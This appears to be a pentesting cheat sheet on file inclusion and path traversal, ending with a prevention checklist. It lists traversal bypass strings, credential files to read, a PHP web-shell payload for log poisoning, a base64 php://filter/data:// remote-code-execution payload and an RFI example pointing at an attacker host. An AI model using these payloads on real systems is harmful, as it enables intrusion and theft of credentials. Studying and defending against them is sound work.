File Inclusion and Path Traversal are vulnerabilities in which an application allows external input to influence the path used to access, read, or execute a file on the server — instead of restricting that input to a fixed, expected set of values.

Types of File Inclusion:

Local File Inclusion
Remote File Inclusion

- **LFI** — the application includes/executes a file that already exists **within the server's own filesystem**. Classic example: `?page=../../../etc/passwd`. In languages that `include()`/`require()` files as executable code (PHP being the most common target), LFI can escalate directly to code execution if the attacker can influence the *contents* of the included file (see LFI2RCE below).

- **RFI** — the application includes/executes a file hosted on an **attacker-controlled remote origin**: `?page=https://attacker-controlled.com/malicious.php`. This is immediately more severe than LFI since the attacker fully controls the file's contents, but it only works when the language/runtime allows remote stream wrappers to be included (e.g. PHP with `allow_url_include=On`, which is disabled by default in modern configurations — making RFI comparatively rare today).

## Directory breakout

Common traversal techniques and filter-bypass variants:

```
../../../../../etc/passwd                     
....//....//....//....//....//etc/passwd     
..././..././..././..././etc/passwd             
%2e%2e%2f (URL-encoded ../)
%252e%252e%252f (double URL-encoded ../)
/etc/passwd                                     # absolute path, no traversal sequence needed
/var/www/html/../../../../../etc/passwd         # traversal appended to a known base path
```

If the app appends a fixed extension (e.g. `.php`) to your input server-side, try path-truncation techniques (long strings of `../` or `./` padding, on older PHP versions) or look for alternate sinks that don't append an extension.

Useful files to target once traversal is confirmed (adjust per OS/stack):

```
/etc/passwd                      # Linux user list
/etc/shadow                      # Linux password hashes (requires elevated read perms)
/proc/self/environ               # process environment variables (may leak secrets, and doubles as an LFI2RCE vector)
/proc/self/cmdline               # process start command
C:\Windows\System32\drivers\etc\hosts   # Windows equivalent recon file
C:\inetpub\wwwroot\web.config     # IIS config, may leak connection strings
<app>/config.php, .env, wp-config.php   # framework/app config files, often contain DB credentials
```

## LFI2RCE

LFI alone only grants **file read**. To escalate to **remote code execution**, you need to either (a) get attacker-controlled content into a file that the traversal can then include/execute, or (b) abuse a wrapper/stream that executes code as a side effect of being read. Common methods:

### Log Poisoning

Send a request where a normally-logged field (User-Agent, Referer, a 404'd URL, a failed login username) contains a PHP payload, e.g.:

```http
User-Agent: <?php system($_GET['cmd']); ?>
```

The web server logs this raw string verbatim (typically `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, or an app-specific log). Then use the LFI to include that log file — since it now contains executable PHP, the server executes your injected payload when the log file is included:

```
?page=../../../../var/log/apache2/access.log&cmd=id
```

Requires the LFI to have read access to the log path (log paths and permissions vary widely by distro/stack — verify the actual path if you have any way to enumerate it, e.g. via a separate LFI read of a config file).

### PHP wrappers

PHP's stream wrappers can be abused to convert an LFI read primitive into code execution, without needing to poison an external file at all.

**`php://filter` + `data://` — single-request RCE**, no upload or log-write needed:

```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7IGVjaG8gJ0hlbGxvIFdvcmxkISc7ID8+
```

The base64 blob decodes to:

```php
<?php system($_GET['cmd']); echo 'Hello World!'; ?>
```

`php://filter/convert.base64-decode/resource=...` tells PHP to base64-decode the given resource before "reading" it — since `data://plain/text,...` lets you inline arbitrary content directly in the URL, this smuggles a PHP payload straight through the traversal/include sink without touching the filesystem at all. Requires `allow_url_include` (for `data://`) to be enabled server-side, so test whether this specific wrapper is permitted before relying on it.

### Other escalation paths worth knowing

- **Session file poisoning** — if the session storage mechanism and path are known/guessable (e.g. PHP's default `/var/lib/php/sessions/sess_<PHPSESSID>`), and any part of the session data is attacker-controlled and reflected unsanitized, poison the session file the same way as a log file, then include it.
- **File upload + direct LFI include** — if uploads land in a predictable, includable path, skip the wrapper entirely and just upload `shell.php` (or `.phtml`/`.php5` if `.php` is blocked) and include it directly.
- **SSH/FTP/mail log poisoning** — same principle as web-server log poisoning, applicable if those logs are reachable via the traversal and the corresponding service exists on the host.

## Preventing

1. **Never build filesystem paths directly from user input.** Map user input to a fixed, server-side allowlist of permitted file identifiers instead (e.g. `?page=about` → server-side lookup table → `about.php`, not string concatenation).
2. If dynamic paths are unavoidable, **canonicalize and validate** the resolved absolute path is still within the intended base directory before opening it (resolve `../` fully, then check the prefix).
3. **Disable dangerous stream wrappers** you don't need — `allow_url_include=Off`, `allow_url_fopen=Off` where feasible.
4. **Run the web server/app with least privilege** so even a successful traversal can't read sensitive OS files like `/etc/shadow`.
5. **Don't reflect unsanitized user input into logs** that are also readable by the same application (or isolate/rotate logs with restrictive permissions to blunt log-poisoning chains).
